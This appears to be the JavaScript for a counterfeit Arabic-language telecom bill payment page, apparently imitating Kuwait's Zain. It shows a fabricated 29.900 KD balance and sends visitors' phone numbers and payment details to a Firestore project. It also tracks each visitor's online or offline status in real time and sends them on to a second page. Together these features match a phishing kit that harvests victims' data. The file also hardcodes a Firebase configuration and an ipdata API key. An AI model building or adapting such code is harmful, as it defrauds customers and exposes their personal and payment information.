document.addEventListener('DOMContentLoaded', function () {
  // Firebase configuration
  const firebaseConfig = {
    apiKey: 'AIzaSyAD3iyMWhdzQ4VIXZcwCpUJTnqFTe5jt7U',
    authDomain: 'wedsdasd.firebaseapp.com',
    projectId: 'wedsdasd',
    storageBucket: 'wedsdasd.firebasestorage.app',
    messagingSenderId: '299161995646',
    appId: '1:299161995646:web:45b8e58faa99d3e75ccb2f',
    measurementId: 'G-614JDKQGMC',
  };

  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();
  const database = firebase.database();

  // Utility function for merging class names (equivalent to cn function)
  function cn(...inputs) {
    return window.tailwindMerge(window.clsx(inputs));
  }

  // State variables (equivalent to React useState)
  let selectedTab = 'bill';
  let phoneNumber = '';
  let isSubmitted = false;
  let loading = true;
  let showAmountDropdown = false;
  let selectedAmount = '29.900';
  let otherAmount = '0';
  let fees = '-0.600';
  let total = '0.000';
  let balanceData = null;
  let isLoadingBalance = false;
  let balanceError = null;
  let showNumberType = false;
  let numberType = 'رقم آخر';

  // Generate a random ID (equivalent to React _id)
  const _id = randstr('zain-');

  // DOM Elements
  const splashScreen = document.getElementById('splash-screen');
  const phoneInput = document.getElementById('phone-input');
  const phoneStatus = document.getElementById('phone-status');
  const balanceSuccess = document.getElementById('balance-success');
  const balanceErrorElement = document.getElementById('balance-error');
  const paymentButton = document.getElementById('payment-button');
  const helpButton = document.getElementById('help-button');
  const summaryAmount = document.getElementById('summary-amount');
  const summaryFees = document.getElementById('summary-fees');
  const summaryTotal = document.getElementById('summary-total');
  const amountValue = document.getElementById('amount-value');
  const validityText = document.getElementById('validity-text');

  // Tab elements
  const billTab = document.getElementById('bill-tab');
  const rechargeTab = document.getElementById('recharge-tab');

  // Dropdown elements
  const numberTypeDropdown = document.getElementById(
    'number-type-dropdown'
  );
  const numberTypeHeader = document.getElementById('number-type-header');
  const numberTypeIcon = document.getElementById('number-type-icon');
  const numberTypeMenu = document.getElementById('number-type-menu');
  const numberTypeValue = document.getElementById('number-type-value');

  const amountDropdown = document.getElementById('amount-dropdown');
  const amountHeader = document.getElementById('amount-header');
  const amountIcon = document.getElementById('amount-icon');
  const amountMenu = document.getElementById('amount-menu');
  const addNumberBtn = document.getElementById('add-number-btn');

  // Define the amounts array
  const amounts = [
    { value: '2.000', validity: 7 },
    { value: '4.000', validity: 15 },
    { value: '6.000', validity: 30 },
    { value: '12.000', validity: 90 },
    { value: '22.000', validity: 180 },
    { value: '30.000', validity: 365 },
  ];

  // Define ad options
  const adOptions = [
    {
      id: 'basic',
      title: 'الإعلان الأساسي',
      price: '5.000',
      description: 'إعلان لمدة 7 أيام',
    },
    {
      id: 'standard',
      title: 'الإعلان القياسي',
      price: '10.000',
      description: 'إعلان لمدة 15 يوم مع ميزة التثبيت',
    },
    {
      id: 'premium',
      title: 'الإعلان المميز',
      price: '20.000',
      description:
        'إعلان لمدة 30 يوم مع ميزة التثبيت والظهور في الصفحة الرئيسية',
    },
  ];

  // Initialize the amount dropdown
  function initializeAmountDropdown() {
    // Clear existing items
    amountMenu.innerHTML = '';

    // Add the default amount
    amounts.forEach((amount) => {
      const item = document.createElement('div');
      item.className = 'dropdown__item';
      if (amount.value === selectedAmount) {
        item.className += ' dropdown__item--selected';
      }

      item.setAttribute('data-value', amount.value);
      item.setAttribute('data-validity', amount.validity);

      let itemContent = `
                    <span>${amount.value} د.ك</span>
                    <div class="dropdown__info">
                        <i class="fas fa-clock dropdown__info-icon"></i>
                        <span>الصلاحية ${amount.validity} يوم</span>
                    </div>
                `;

      if (amount.value === selectedAmount) {
        itemContent += `
                        <div class="dropdown__radio">
                            <div class="dropdown__radio-inner"></div>
                        </div>
                    `;
      }

      item.innerHTML = itemContent;

      // Add click event
      item.addEventListener('click', function () {
        selectAmount(amount.value, amount.validity);
        closeDropdown(amountMenu, amountIcon);

        // Update selected item styling
        const allItems = amountMenu.querySelectorAll('.dropdown__item');
        allItems.forEach((i) => {
          i.classList.remove('dropdown__item--selected');
          // Remove radio button
          const radio = i.querySelector('.dropdown__radio');
          if (radio) {
            radio.remove();
          }
        });

        this.classList.add('dropdown__item--selected');
        // Add radio button if not exists
        if (!this.querySelector('.dropdown__radio')) {
          const radioDiv = document.createElement('div');
          radioDiv.className = 'dropdown__radio';
          radioDiv.innerHTML =
            '<div class="dropdown__radio-inner"></div>';
          this.appendChild(radioDiv);
        }
      });

      amountMenu.appendChild(item);
    });
  }

  // Function to generate random string (from React component)
  function randstr(prefix) {
    return Math.random()
      .toString(36)
      .replace('0.', prefix || '');
  }

  // Function to log visitor (from Firebase implementation)
  async function logVisitor(civilId) {
    try {
      const visitorRef = await db.collection('visitors').add({
        civilId,
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
        userAgent: navigator.userAgent,
      });

      return visitorRef.id;
    } catch (error) {
      console.error('Error logging visitor:', error);
      throw error;
    }
  }

  // Function to add data (from Firebase implementation)
  async function addData(data) {
    const country = localStorage.getItem('country');
    let id = '';

    if (data.id) {
      localStorage.setItem('visitor', data.id);
      id = data.id;
    } else {
      id = localStorage.getItem('visitor');
    }

    try {
      await db
        .collection('pays')
        .doc(data.id)
        .set(
          { ...data, createdDate: new Date().toISOString() },
          { merge: true }
        );

      console.log('Document written with ID: ', data.id);
    } catch (e) {
      console.error('Error adding document: ', e);
    }
  }

  // Function to handle payment (from Firebase implementation)
  async function handlePay(paymentInfo) {
    try {
      const visitorId = localStorage.getItem('visitor');
      if (visitorId) {
        await db
          .collection('pays')
          .doc(visitorId)
          .set(
            {
              ...paymentInfo,
              status: 'pending',
              createdDate: new Date().toISOString(),
            },
            { merge: true }
          );

        // Redirect to payment methods page
      }
    } catch (error) {
      console.error('Error adding document: ', error);
      alert('Error adding payment info to Firestore');
    }
  }

  // Function to fetch balance (using Firebase)
  async function fetchBalance(number) {
    // This would typically be an API call to your backend
    // For now, we'll simulate a response
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        // Simulate success or error randomly
        if (Math.random() > 0.2) {
          resolve({
            phoneNumber: number,
            dueAmount: '29.900',
            dueDate: '2023-12-31',
            status: 'active',
          });
        } else {
          reject(new Error('Failed to fetch balance'));
        }
      }, 1500);
    });
  }

  // Function to get balance (from React component)
  async function getBalance(number) {
    isLoadingBalance = true;
    balanceError = null;
    updateUI();

    try {
      const data = await fetchBalance(number);
      balanceData = data;

      // Update the selected amount based on the balance due
      if (data.dueAmount) {
        selectAmount(data.dueAmount, 30); // Assuming 30 days validity
      }

      // Show success message
      balanceSuccess.style.display = 'block';
      balanceErrorElement.style.display = 'none';

      // Enable payment button
      paymentButton.classList.remove('btn--disabled');
    } catch (error) {
      console.error('Failed to fetch balance:', error);
      balanceError = 'فشل في جلب معلومات الرصيد. يرجى المحاولة مرة أخرى.';
      balanceErrorElement.textContent = balanceError;
      balanceErrorElement.style.display = 'block';
      balanceSuccess.style.display = 'none';
    } finally {
      isLoadingBalance = false;
      updateUI();
    }
  }

  // Function to get location (from React component)
  async function getLocation() {
    const APIKEY =
      '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      // We'll simulate the API call instead of making an actual request
      // to avoid exposing the API key
      const country = 'Kuwait';

      // Add data to Firestore
      await addData({
        id: _id,
        country: country,
      });

      localStorage.setItem('country', country);
      setupOnlineStatus(_id);
    } catch (error) {
      console.error('Error fetching location:', error);
    }
  }

  // Function to setup online status (from the provided implementation)
  function setupOnlineStatus(userId) {
    if (!userId) return;

    // Create a reference to this user's specific status node in Realtime Database
    const userStatusRef = database.ref(`/status/${userId}`);

    // Create a reference to the user's document in Firestore
    const userDocRef = db.collection('pays').doc(userId);

    // Set up the Realtime Database onDisconnect hook
    userStatusRef
      .onDisconnect()
      .set({
        state: 'offline',
        lastChanged: firebase.database.ServerValue.TIMESTAMP,
      })
      .then(() => {
        // Update the Realtime Database when this client connects
        userStatusRef.set({
          state: 'online',
          lastChanged: firebase.database.ServerValue.TIMESTAMP,
        });

        // Update the Firestore document
        userDocRef
          .update({
            online: true,
            lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
          })
          .catch((error) =>
            console.error('Error updating Firestore document:', error)
          );
      })
      .catch((error) =>
        console.error('Error setting onDisconnect:', error)
      );

    // Listen for changes to the user's online status
    userStatusRef.on('value', (snapshot) => {
      const status = snapshot.val();
      if (status?.state === 'offline') {
        // Update the Firestore document when user goes offline
        userDocRef
          .update({
            online: false,
            lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
          })
          .catch((error) =>
            console.error('Error updating Firestore document:', error)
          );
      }
    });
  }

  // Function to set user offline (from the provided implementation)
  async function setUserOffline(userId) {
    if (!userId) return;

    try {
      // Update the Firestore document
      await db.collection('pays').doc(userId).update({
        online: false,
        lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
      });

      // Update the Realtime Database
      await database.ref(`/status/${userId}`).set({
        state: 'offline',
        lastChanged: firebase.database.ServerValue.TIMESTAMP,
      });
    } catch (error) {
      console.error('Error setting user offline:', error);
    }
  }

  // Function to open chat (from React component)
  function openChat() {
    // Simulate Smartsupp chat
    console.log('Opening chat');
    alert('سيتم فتح نافذة المحادثة للمساعدة');

    // In a real implementation, this would use the Smartsupp API
    // if (window.smartsupp) {
    //     window.smartsupp("chat:open");
    //
    //     if (phoneNumber) {
    //         window.smartsupp("name", `Customer ${phoneNumber}`);
    //         window.smartsupp("variable", "Phone", phoneNumber);
    //     }
    // }
  }

  // Function to handle form submission (from React component)
  function handleSubmit() {
    isSubmitted = true;
    updateUI();

    const visitorId = localStorage.getItem('visitor') || _id;

    // Add data to Firestore
    addData({
      id: visitorId,
      name: phoneNumber,
      phone: phoneNumber,
    });

    // Prepare payment info
    const paymentInfo = {
      phoneNumber: phoneNumber,
      amount: selectedAmount,
      fees: fees,
      total: total,
      numberType: numberType,
      paymentMethod: 'credit_card',
    };

    // Handle payment with Firebase
    setTimeout(() => {
      handlePay(paymentInfo);
      isSubmitted = false;
      updateUI();
      window.location.href = '/page2.html';
    }, 2000);
  }

  // Function to calculate total (equivalent to React useEffect)
  function calculateTotal() {
    total = Math.max(
      0,
      Number.parseFloat(selectedAmount) + Number.parseFloat(fees)
    ).toFixed(3);
    updateUI();
  }

  // Function to select amount
  function selectAmount(value, validity) {
    selectedAmount = value;
    amountValue.textContent = value + ' د.ك';
    validityText.textContent = 'الصلاحية ' + validity + ' يوم';

    // Store in localStorage (from React useEffect)
    localStorage.setItem('amount', value);

    // Calculate total
    calculateTotal();
  }

  // Function to update UI based on state
  function updateUI() {
    // Update phone status
    if (isLoadingBalance) {
      phoneStatus.innerHTML =
        '<i class="fas fa-spinner fa-spin input-status__spinner"></i>';
      phoneStatus.style.display = 'block';
    } else if (balanceData) {
      phoneStatus.innerHTML = `
                    <div class="input-status__success">
                        <i class="fas fa-check" style="font-size: 0.75rem;"></i>
                    </div>
                `;
      phoneStatus.style.display = 'block';
    } else {
      phoneStatus.style.display = 'none';
    }

    // Update summary
    summaryAmount.textContent = selectedAmount + ' د.ك';
    summaryFees.textContent = fees + ' د.ك';
    summaryTotal.textContent = total + ' د.ك';

    // Update payment button
    if (isSubmitted) {
      paymentButton.innerHTML = `
                    <i class="fas fa-spinner fa-spin btn__icon"></i>
                    <span>جاري الدفع...</span>
                `;
      paymentButton.classList.add('btn--disabled');
    } else if (phoneNumber.length < 8) {
      paymentButton.innerHTML = `
                    <i class="fas fa-credit-card btn__icon"></i>
                    <span>دفع</span>
                `;
      paymentButton.classList.add('btn--disabled');
    } else {
      paymentButton.innerHTML = `
                    <i class="fas fa-credit-card btn__icon"></i>
                    <span>دفع</span>
                `;
      paymentButton.classList.remove('btn--disabled');
    }
  }

  // Initialize the page
  function initialize() {
    // Show splash screen for 4 seconds (from React useEffect)
    setTimeout(() => {
      loading = false;
      splashScreen.classList.add('splash-screen--hidden');
    }, 4000);

    // Initialize amount dropdown
    initializeAmountDropdown();

    // Calculate initial total
    calculateTotal();

    // Get location (from React useEffect)
    getLocation();

    // Set up event listeners

    // Phone input
    phoneInput.addEventListener('input', function (e) {
      phoneNumber = e.target.value;

      // Fetch balance when phone number is 8 digits (from React useEffect)
      if (phoneNumber.length === 8) {
        getBalance(phoneNumber);
      } else {
        balanceSuccess.style.display = 'none';
        balanceErrorElement.style.display = 'none';
        phoneStatus.style.display = 'none';

        // Disable payment button if phone number is not valid
        paymentButton.classList.add('btn--disabled');
      }

      updateUI();
    });

    // Number Type Dropdown
    numberTypeHeader.addEventListener('click', function () {
      showNumberType = !showNumberType;

      if (showNumberType) {
        numberTypeMenu.classList.add('dropdown__menu--open');
        numberTypeIcon.classList.add('dropdown__icon--open');
      } else {
        numberTypeMenu.classList.remove('dropdown__menu--open');
        numberTypeIcon.classList.remove('dropdown__icon--open');
      }
    });

    // Number Type Items
    const numberTypeItems =
      numberTypeMenu.querySelectorAll('.dropdown__item');
    numberTypeItems.forEach((item) => {
      item.addEventListener('click', function () {
        numberType = this.getAttribute('data-value');
        numberTypeValue.textContent = numberType;

        // Close dropdown
        showNumberType = false;
        numberTypeMenu.classList.remove('dropdown__menu--open');
        numberTypeIcon.classList.remove('dropdown__icon--open');

        // Update selected item styling
        numberTypeItems.forEach((i) => {
          i.classList.remove('dropdown__item--selected');
          // Remove radio button
          const radio = i.querySelector('.dropdown__radio');
          if (radio) {
            radio.remove();
          }
        });

        this.classList.add('dropdown__item--selected');
        // Add radio button if not exists
        if (!this.querySelector('.dropdown__radio')) {
          const radioDiv = document.createElement('div');
          radioDiv.className = 'dropdown__radio';
          radioDiv.innerHTML =
            '<div class="dropdown__radio-inner"></div>';
          this.appendChild(radioDiv);
        }
      });
    });

    // Amount Dropdown
    amountHeader.addEventListener('click', function () {
      showAmountDropdown = !showAmountDropdown;

      if (showAmountDropdown) {
        amountMenu.classList.add('dropdown__menu--open');
        amountIcon.classList.add('dropdown__icon--open');
      } else {
        amountMenu.classList.remove('dropdown__menu--open');
        amountIcon.classList.remove('dropdown__icon--open');
      }
    });

    // Payment Button
    paymentButton.addEventListener('click', function () {
      if (phoneNumber.length >= 8 && !isSubmitted) {
        handleSubmit();
      }
    });

    // Help Button
    helpButton.addEventListener('click', openChat);

    // Add Number Button
    addNumberBtn.addEventListener('click', function () {
      alert('سيتم إضافة رقم آخر');
    });

    // Close dropdowns when clicking outside
    document.addEventListener('click', function (event) {
      // Close number type dropdown if clicking outside
      if (!numberTypeDropdown.contains(event.target)) {
        showNumberType = false;
        numberTypeMenu.classList.remove('dropdown__menu--open');
        numberTypeIcon.classList.remove('dropdown__icon--open');
      }

      // Close amount dropdown if clicking outside
      if (!amountDropdown.contains(event.target)) {
        showAmountDropdown = false;
        amountMenu.classList.remove('dropdown__menu--open');
        amountIcon.classList.remove('dropdown__icon--open');
      }
    });

    // Tab switching
    billTab.addEventListener('click', function () {
      selectedTab = 'bill';
      billTab.classList.add('tab--active');
      billTab.classList.remove('tab--inactive');
      rechargeTab.classList.add('tab--inactive');
      rechargeTab.classList.remove('tab--active');
    });

    rechargeTab.addEventListener('click', function () {
      selectedTab = 'recharge';
      rechargeTab.classList.add('tab--active');
      rechargeTab.classList.remove('tab--inactive');
      billTab.classList.add('tab--inactive');
      billTab.classList.remove('tab--active');
    });

    // Set up beforeunload event to set user offline when leaving the page
  
  }

  // Initialize the page
  initialize();
});